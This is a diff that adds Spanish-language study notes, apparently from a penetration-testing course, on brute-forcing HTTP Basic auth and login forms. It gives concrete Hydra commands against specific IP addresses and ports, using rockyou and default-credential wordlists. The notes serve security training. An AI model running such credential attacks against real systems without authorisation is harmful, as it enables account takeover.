@@ -1,0 +1,43 @@
+####Login Brute forcing
+
+	###Basic HTTP Auth Brute Forcing
+HTTP provee dos formas de autenticar a los usuarios:
+Basic HTTP Auth: Autentica usuarios al servidor HTTP. Usa el ID del usuario y la contraseña. En primera instacia el cliente envia la request sin info de authenticacion y el server responde con www-Authenticate header el cual le consulta al usuario por credenciales.
+Proxy Server Authentication: Se usa para autenticar un usuario a un proxy intermediario.
+	##Brute force attack
+Es una tecnica lenta que intenta todas las convinaciones de caracteres parra encontrar la que funciona.
+	##Dictionary attacks
+Es una tecnica similar a la anterior pero en vez de intentar todas las convinaciones usa un diccionario de donde va agarrando las diferentes entradas para probar.
+	##Default passwords
+Las contraseñas default son faciles de recordar, cortas y muchas veces conocidas. Muchos servicios o aplicacinoes poseen estas contraseñas por defecto para ciertos usuarios.
+	
+	##Hydra
+hydra -C /wordlist/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
+#-C es la flag para contraseñas y usuarios convinados. -s es la flag para el puerto y http-get es el metodo siendo / la direccion
+
+hydra -L /wordlist/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
+#-L para pasar diccionario de usuarios, -P para diccionario de pswd (minuscula para no usar diccionario). -f para parar a la primera que encuentre.
+#Con -u intentamos los usuarios en al contraseñas y no las contraseñas en los usuarios.
+
+	#Login.php
+Cuando tenemos un forrmulario para loguearnos primero se debe intentar mandar el menor trafico posible. Esto es posible intentando de forma manula las credenciales comunes.
+En Hydra tenemos 2 modulos: http-get http-post; http-post-form.
+El primero, usado anes en este txt sirrve para HHTTP auth, mientras que el segundo sirve para formularios como por ej un login.php.
+
+hydra http-post-form -U
+#Vemos el ayuda parra el modulo mencionado
+
+"/<direccion>:<parrametro de usuario>=^USER^&<parametro password>=^PASS^:<F/S>=>success/failed string>"
+#Esto debe unirse a la sintaxis normal de hydra como se muestra abajo
+#La direccion hace referencia a donde eesta el form. Ej: url/login.php
+#Parametro usr o pwd es el nombre al que se le asigna para ser enviado por post en la request
+#F/S hace rreferencia a que si Falla la conexion, se va a encontrar el strring X; Si es Success vamos a encontrrar el string X. Se usa UNO a la vez.
+#El strring deebe ser un strring que se nos retorna cuando es S oo F para que hydra sepa si se ingreso o no. Para ello podemos ver el codigo HTML de la respuesta
+
+
+hydra -C /wordlist/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/<direccion>:<parrametro de usuario>=^USER^&<parametro password>=^PASS^:<F/S>=>success/failed string>"
+#Default creds con http-post-form
+hydra -l admin -P /wordlist/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/<direccion>:<parrametro de usuario>=^USER^&<parametro password>=^PASS^:<F/S>=>success/failed string>"
+#Con diccionarios
+
+
